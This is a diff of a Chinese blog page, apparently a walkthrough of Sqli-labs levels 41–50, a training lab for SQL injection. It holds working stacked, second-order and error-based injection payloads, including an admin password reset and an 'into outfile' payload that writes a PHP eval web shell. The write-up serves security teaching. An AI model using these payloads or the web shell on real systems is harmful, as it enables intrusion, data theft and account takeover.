@@ -10,9 +10,8 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate">
     <meta name="keywords" content="TriDiamond Obsidian,"> 
-    <meta name="description" content="前一部分链接：第31-40关Write-up
-Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload
-?id=1;insert into users(,"> 
+    <meta name="description" content="Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload
+?id=1;insert into users(id,username,password) v,"> 
     <meta name="author" content="Knlvre"> 
     <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
     <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
@@ -86,7 +85,7 @@ Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    7.9k
+                    7.7k
                 </span>
                 
                 
@@ -126,48 +125,54 @@ Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
-<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是<code>整形</code>注入，payload</p>
-<pre><code>?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
-</code></pre><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>本关通过<code>POST</code>方式提交参数，并且无法<code>创建用户</code>和<code>忘记秘密</code>这两个操作，所以想到应该是结合前面<code>二次注入（存储型注入）</code>+<code>堆叠注入</code>的知识，通过堆叠注入创建一个账号<code>（admin&#39;#）</code>，然后再通过这个账号去修改admin的密码，进入后台</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-1.png" alt="2-1"></p>
+            <h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是<code>整形</code>注入，payload</p>
+<pre><code class="Code">?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
+</code></pre>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>本关通过<code>POST</code>方式提交参数，并且无法<code>创建用户</code>和<code>忘记秘密</code>这两个操作，所以想到应该是结合前面<code>二次注入（存储型注入）</code>+<code>堆叠注入</code>的知识，通过堆叠注入创建一个账号<code>（admin&#39;#）</code>，然后再通过这个账号去修改admin的密码，进入后台</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-1.png" alt></p>
 <p>动手尝试一下，payload</p>
-<pre><code>username:1&#39;;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
+<pre><code class="Code">username:1&#39;;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
 
 password:随意
-</code></pre><p>登录<code>users37</code>时，发现登录不了，试着把注入语句换到password试一下</p>
-<pre><code>username:随意
+</code></pre>
+<p>登录<code>users37</code>时，发现登录不了，试着把注入语句换到password试一下</p>
+<pre><code class="Code">username:随意
 
 password:1&#39;;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
-</code></pre><p>在此登录时发现可以了，之后查看源码发现是username使用<code>mysql_real_escape_string()</code>函数进行了过滤，而password没有过滤。既然可以插入用户，那现在就插入<code>（admin&#39;#）</code>，注意这里的单引号要<code>加一个反斜杠</code>才行</p>
+</code></pre>
+<p>在此登录时发现可以了，之后查看源码发现是username使用<code>mysql_real_escape_string()</code>函数进行了过滤，而password没有过滤。既然可以插入用户，那现在就插入<code>（admin&#39;#）</code>，注意这里的单引号要<code>加一个反斜杠</code>才行</p>
 <pre><code>username:随意
 
 password:1&#39;;insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\&#39;#&#39;,&#39;password37&#39;);--+
 </code></pre><p>可以登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-2.png" alt="2-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-2.png" alt></p>
 <p>接下来就是修改密码，先看一下数据库里<code>admin</code>用户的密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-3.png" alt="2-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-3.png" alt></p>
 <p>将admin的密码更改为666，然后再次看一下数据库，更改成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-4.png" alt="2-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-4.png" alt></p>
 <p>并且可以登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-5.png" alt="2-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-5.png" alt></p>
 <h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>通过报错信息可以知道，与前一关不一样的就是，参数通过<code>(&#39;&#39;)</code>包裹，payload</p>
-<pre><code>username:随意
+<pre><code class="Code">username:随意
 
 password:1&#39;);insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\&#39;#&#39;,&#39;password37&#39;);--+
-</code></pre><p>其他一样，，不再赘述</p>
+</code></pre>
+<p>其他一样，不再赘述</p>
 <h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>除了没有报错信息之外，这关与Less-42没有区别，payload</p>
-<pre><code>username:随意
+<pre><code class="Code">username:随意
 
 password:1&#39;;insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\&#39;#&#39;,&#39;password37&#39;);--+
-</code></pre><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>除了没有报错信息之外，这关与Less-43没有区别，payload</p>
-<pre><code>username:随意
+</code></pre>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>除了没有报错信息之外，这关与Less-43没有区别，payload</p>
+<pre><code class="Code">username:随意
 
 password:1&#39;);insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\&#39;#&#39;,&#39;password37&#39;);--+
-</code></pre><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>本关开始，考查的是<code>order by注入</code>的利用，关于order by注入的知识点可以看我的文章<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a>的<code>Tip 6</code> </p>
+</code></pre>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>本关开始，考查的是<code>order by注入</code>的利用，关于order by注入的知识点可以看我的文章Sqli-labs Tips的<code>Tip 6</code> </p>
 <p>本关就用<code>rand()</code>函数进行盲注，先来看一下<code>rand(true)</code>和<code>rand(false)</code>的区别</p>
-<pre><code>?sort=rand(true)
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt="6-1"></p>
+<pre><code class="Code">?sort=rand(true)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt></p>
 <pre><code>?sort=rand(false)
 </code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-2.png" alt="6-2"></p>
 <p>现在就可以写一个python来爆破</p>
@@ -220,29 +225,33 @@ for i in table_array:
 <h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关对<code>sort</code>参数的处理加上了单引号，那么此处就不能直接像之前那样子<code>?sort=rand()</code>，因为如果加上单引号会让函数变成字符串<code>?sort=&#39;rand()&#39;</code>，就不能执行，所以本关必须要闭合掉前面的单引号</p>
 <p>这里我们用<code>报错注入</code></p>
 <p>双查询报错注入</p>
-<pre><code>#爆数据库
+<pre><code class="Code">#爆数据库
 ?sort=1&#39; and (select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+
 
 #爆列名
 ?sort=1&#39; and (select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),0x3a,floor(rand(0)*2)))--+
-</code></pre><p>procedure analyse()</p>
-<pre><code>#爆用户名
+</code></pre>
+<p>procedure analyse()</p>
+<pre><code class="Code">#爆用户名
 ?sort=1&#39; procedure analyse(extractvalue(1,concat(0x3a,user())),1)--+
-</code></pre><p>extractvalue()</p>
-<pre><code>#爆表名
+</code></pre>
+<p>extractvalue()</p>
+<pre><code class="Code">#爆表名
 ?sort=1&#39; and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a))--+
-</code></pre><p>updatexml()</p>
-<pre><code>#爆列名
+</code></pre>
+<p>updatexml()</p>
+<pre><code class="Code">#爆列名
 ?sort=1&#39; and updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x3a),1)--+
-</code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>本关方法与Less-46一样，唯一区别就是没有报错信息，不再赘述</p>
+</code></pre>
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>本关方法与Less-46一样，唯一区别就是没有报错信息，不再赘述</p>
 <h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>本关方法与Less-47一样，唯一区别就是没有报错信息</p>
 <p>我们用<code>into outfile</code>来注入试一下</p>
-<pre><code>?sort=1&#39; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-49\\shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e--+
-</code></pre><p>可以看到已经把马给写进去了，并且菜刀可以成功连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/9-1.png" alt="9-1"></p>
+<pre><code class="Code">?sort=1&#39; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-49\\shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e--+
+</code></pre>
+<p>可以看到已经把马给写进去了，并且菜刀可以成功连接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/9-1.png" alt></p>
 <h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>本关开始，考察的是<code>order by注入</code>+<code>堆叠注入</code>，使用<code>mysqli_multi_query()</code>函数，前面关卡已经讲解过，不再赘述</p>
 <p>至此，41-50关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/03/Sqli-labs%20%E7%AC%AC51-65%E5%85%B3/">第51-60关Write-up</a>Less-51</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
